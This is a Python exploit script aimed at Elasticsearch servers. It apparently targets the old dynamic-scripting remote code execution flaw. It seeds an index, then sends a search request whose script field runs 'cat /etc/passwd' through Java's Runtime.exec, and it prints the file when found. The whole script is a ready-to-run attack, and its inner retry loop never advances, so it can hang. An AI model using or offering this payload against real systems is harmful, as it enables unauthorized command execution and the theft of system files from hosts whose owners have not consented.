#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import requests
requests.packages.urllib3.disable_warnings()
import sys
import colorama
colorama.init(autoreset=True)
def Test(raw_url):
	print(colorama.Fore.GREEN+'-----------------------------------------')
	print(colorama.Fore.GREEN+'---------------Target Test---------------')
	print(colorama.Fore.GREEN+'-----------------------------------------')
	i=0
	p=0
	proto=['http','https']
	headers={
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
			'Content-type': 'application/json',
			'Accept': 'application/json, text/javascript, */*; q=0.01',
		}
	while i<2:
		url='{}://{}/website/blog/'.format(proto[i],raw_url)
		data='{"name":"test"}'
		i+=1
		try:
			response=requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
			if 'id' in response.text:
				while p<2:
					url=url.split(':')[0]+'://'+raw_url+'/_search?pretty'
					data=r'{"size": 1,"query": {"filtered": {"query": {"match_all": {}}}},"script_fields": {"command": {"script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'
					response=requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
					if 'root:' in response.text:
						print(response.text)
						return True
			else:
				return False
		except Exception as e:
			return False
if __name__ == '__main__' :
	target=sys.argv[1]
	result=Test(target)
	if result:
		print(colorama.Fore.GREEN+'Exist')
	else:
		print(colorama.Fore.GREEN+'Not Exist')

